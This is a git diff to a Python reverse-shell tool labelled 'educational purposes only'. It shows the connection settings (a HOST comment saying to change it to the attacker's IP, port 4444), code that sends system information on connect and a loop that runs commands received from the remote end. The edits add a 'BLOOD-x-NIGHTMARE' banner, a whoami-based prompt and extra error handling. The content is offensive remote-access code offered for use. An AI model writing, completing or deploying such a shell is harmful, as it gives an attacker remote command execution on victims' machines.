@@ -2,6 +2,7 @@
 # Advanced Reverse Shell (Educational Purposes Only)
 # Author: Hamza Mahmoud (bugbounty88)
 # Modified Date: 18/7/2025
+# Last Version : 2.1
 
 import socket
 import time
@@ -24,8 +25,8 @@ class Colors:
 
 # ========== Connection Settings ==========
 class Config:
-    HOST = "127.0.0.1"  # Change this to attacker's IP
-    PORT = 4444
+    HOST = "127.0.0.1"  # Change this to attacker's IP (localhost for testing)
+    PORT = 4444         # Change this to attacker's PORT
     RECONNECT_DELAY = 5  # Seconds between connection attempts
     BUFFER_SIZE = 1024 * 4  # Data packet size
     USE_SSL = False  # Enable for encrypted connection
@@ -79,8 +80,10 @@ class ReverseShell:
                 
                 self.socket.connect((Config.HOST, Config.PORT))
                 self.connection_active = True
-                self.send_data(Colors.GREEN + "[+] Successfully connected to server" + Colors.RESET)
+                self.send_data(Colors.GREEN + "[+] Welcome to BLOOD-x-NIGHTMARE\n" + Colors.RESET)
+                self.send_data(Colors.GREEN + "[+] Successfully connected to server\n" + Colors.RESET)
                 self.send_data(get_system_info())
+                print("[+] Succsesfully connected to server.")
                 return True
                 
             except Exception as e:
@@ -92,7 +95,7 @@ class ReverseShell:
         try:
             if isinstance(data, str):
                 data = data.encode()
-            self.socket.send(data + b"\n")
+            self.socket.send(data + b"")
         except Exception as e:
             self.connection_active = False
             raise e
@@ -107,7 +110,6 @@ class ReverseShell:
                     break
                 
                 self.command_queue.put(command)
-                
             except Exception as e:
                 self.connection_active = False
                 self.send_data(Colors.RED + f"[-] Command receive error: {str(e)}" + Colors.RESET)
@@ -123,8 +125,12 @@ class ReverseShell:
                 
                 try:
                     output = execute_command(command)
-                    prompt = f"\n{Colors.BLUE}┌──({Colors.RED}root@{socket.gethostname()}{Colors.BLUE})-[~]\n└─$ {Colors.RESET}"
-                    self.send_data(output + prompt)
+                    if subprocess.getoutput("whoami") == "root":
+                        prompt = "root@shell# "
+                        self.send_data(output + prompt)
+                    else:
+                        prompt = subprocess.getoutput("whoami") + "@shell$ "
+                        self.send_data(output + prompt)
                 except Exception as e:
                     self.send_data(f"Error: {str(e)}")
 
@@ -149,6 +155,9 @@ class ReverseShell:
             if self.socket:
                 self.socket.close()
             sys.exit(0)
+        except OSError:
+            print("[-] Session closed or may connection failed.")
+            time.sleep(1)
 
 input("Press Enter to continue or Ctrl+C to cancel...")
 
